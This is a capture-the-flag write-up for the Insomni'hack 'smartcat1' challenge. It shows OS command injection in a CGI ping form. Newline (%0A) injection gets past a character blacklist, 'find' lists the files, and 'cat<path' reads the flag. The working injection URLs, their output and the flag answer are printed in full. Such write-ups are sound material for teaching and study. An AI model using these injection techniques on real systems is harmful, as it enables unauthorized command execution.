# Insomni'hack : smartcat1

#### Author: Wh1t3Fox

**Description**:
> We were given a website and told that only a single ping could be sent at a time.
> We were given a text box where we needed to enter the host to ping.

After entering random characters into the text box it was easy to see that there was a blacklist of characters.
The following characters were included in the blacklist: **" $;&|({`\t"**.

Because the challenge was smart cat debugging, we figured that we would need to use the cat command to access the
flag which was located somewhere on the remote system. Using Burpsuite to test bad characters in the input we noticed
that we would execute multiple commands using **%0A**, newline, to inject multiple commands. The most difficult part
here was trying to inject commands without using spaces because nearly ever command requires a space in order to execute.

Using the find command we were able to view the files in our current directory which revealed:

    http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=google.com%0Afind

    PING google.com (74.125.24.138) 56(84) bytes of data.
    64 bytes from de-in-f138.1e100.net (74.125.24.138): icmp_seq=1 ttl=49 time=1.16 ms

    --- google.com ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 1.163/1.163/1.163/0.000 ms
    .
    ./index.cgi
    ./there
    ./there/is
    ./there/is/your
    ./there/is/your/flag
    ./there/is/your/flag/or
    ./there/is/your/flag/or/maybe
    ./there/is/your/flag/or/maybe/not
    ./there/is/your/flag/or/maybe/not/what
    ./there/is/your/flag/or/maybe/not/what/do
    ./there/is/your/flag/or/maybe/not/what/do/you
    ./there/is/your/flag/or/maybe/not/what/do/you/think
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
    ./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag


Now we knew where the flag was, but it took a while for us to figure out how to read the file. Eventually we came to
the conclusion and realized that cat could be used without spaces by injecting:

    http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=google.com%0Acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag

    PING google.com (74.125.24.113) 56(84) bytes of data.
    64 bytes from de-in-f113.1e100.net (74.125.24.113): icmp_seq=1 ttl=48 time=6.11 ms

    --- google.com ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 6.110/6.110/6.110/0.000 ms
    INS{warm_kitty_smelly_kitty_flush_flush_flush}
